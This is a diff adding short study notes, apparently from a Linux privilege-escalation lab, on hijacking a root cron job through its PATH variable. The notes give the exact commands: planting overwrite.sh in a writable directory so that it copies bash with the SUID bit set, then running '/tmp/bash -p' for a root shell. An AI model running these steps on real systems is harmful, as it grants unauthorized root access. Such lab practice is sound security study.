@@ -1,0 +1,43 @@
+
+Privilege Escalation - Cron (Path) 
+
+NOTES : Scheduled Task commonly known as cron jobs. 
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+these process is running every single minute on this machine. 
+
+
+Detection
+
+Linux VM
+
+1. In command prompt type: cat /etc/crontab
+2. From the output, notice the value of the “PATH” variable.
+
+Exploitation
+
+Linux VM
+
+1. In command prompt type:
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+2. In command prompt type: chmod +x /home/user/overwrite.sh
+3. Wait 1 minute for the Bash script to execute.
+4. In command prompt type: /tmp/bash -p
+5. In command prompt type: id
+
+
+******************************************************************************************************
+
+Cron Paths : 
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+every job first look itself first in /home/user then /usr/local/sbin  /usr/local/bin  any so forth and so on 
+
+just make a malicious script and paste it to the first address 
+
+
+************************************************************************************************************
+
+
+
+
